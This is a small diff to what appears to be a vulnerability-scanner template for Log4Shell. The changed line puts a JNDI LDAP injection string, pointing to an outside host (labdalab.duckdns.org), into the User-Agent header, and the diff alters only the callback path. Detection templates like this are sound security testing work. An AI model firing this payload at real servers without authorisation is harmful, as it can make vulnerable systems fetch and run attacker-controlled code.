@@ -10,7 +10,7 @@ requests:
   - raw:
       - |+
         GET / HTTP/1.1
-        {{header}}: ${jndi:ldap://labdalab.duckdns.org:4567/gotcha}
+        {{header}}: ${jndi:ldap://labdalab.duckdns.org:4567/a}
     payloads:
       header:
         - User-Agent
